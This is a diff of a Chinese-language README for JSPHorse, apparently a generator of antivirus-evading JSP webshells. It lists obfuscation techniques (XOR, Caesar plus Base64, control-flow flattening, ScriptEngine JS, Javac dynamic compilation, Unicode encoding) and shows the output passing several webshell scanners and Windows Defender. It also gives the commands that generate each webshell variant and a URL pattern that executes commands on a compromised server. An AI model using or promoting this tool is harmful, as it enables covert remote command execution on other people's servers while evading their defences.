@@ -27,14 +27,15 @@
 特点：
 
 - Java反射调用
-- 双重异或加密数字常量
+- ScriptEngine调用JS免杀
+- 使用分割和注释绕过可能的JS黑名单
+- Javac动态编译class免杀（参考三梦师傅代码）
+- 双重随机异或运算加密数字常量
 - 凯撒密码随机偏移并结合Base64双重加密字符串常量
 - 使用控制流平坦化并随机生成分发器
 - 所有标识符全部替换为随机字符串
 - 支持全局Unicode编码
 - 每次执行都会生成完全不同的马（结构相同内容不同）
-- 参考三梦师傅代码完成Javac动态编译class进一步免杀
-- 正在编写ScriptEngine调用JS免杀（即将完成）
 
 简单测试了免杀效果：
 
@@ -43,6 +44,38 @@
 | 百度WEBDIR+ | ![](https://img.shields.io/badge/pass-green) |
 | 河马SHELLPUB | ![](https://img.shields.io/badge/pass-green) |
 | Windows Defender | ![](https://img.shields.io/badge/pass-green) |
+
+## Quick Start
+
+在Github右侧Release页面下载
+
+生成标准形式Webshell
+
+`java -jar JSPHorse.jar -p your_password`
+
+全局Unicode编码（JSP支持全局Unicode编码）
+
+`java -jar JSPHorse.jar -p your_password -u`
+
+生成进阶版Webshell（Javac动态编译class）
+
+`java -jar JSPHorse.jar -p your_password --super`
+
+进阶版Webshell基础上全局Unicode编码
+
+`java -jar JSPHorse.jar -p your_password --super -u`
+
+使用ScriptEngine调用JS免杀
+
+`java -jar JSPHorse.jar -p your_password --js`
+
+使用ScriptEngine调用JS免杀基础上全局Unicode编码
+
+`java -jar JSPHorse.jar -p your_password --js -u`
+
+如何使用？
+
+http://xxx/1.jsp?pwd=your_password&cmd=calc.exe
 
 生成JSP大致代码如下：
 
@@ -74,34 +107,6 @@
                     break;
 ......................................................
 ```
-
-## Quick Start
-
-在Github右侧Release页面下载
-
-生成标准形式Webshell
-
-`java -jar JSPHorse.jar -p your_password`
-
-全局Unicode编码（JSP支持全局Unicode编码）
-
-`java -jar JSPHorse.jar -p your_password -u`
-
-生成进阶版Webshell（Javac动态编译class）
-
-`java -jar JSPHorse.jar -p your_password --super`
-
-进阶版Webshell基础上全局Unicode编码
-
-`java -jar JSPHorse.jar -p your_password --super -u`
-
-使用木头神提供的JS免杀（未测试）
-
-`java -jar JSPHorse.jar -p your_password -j`
-
-如何使用？
-
-http://xxx/1.jsp?pwd=your_password&cmd=calc.exe
 
 ## 免责申明
 
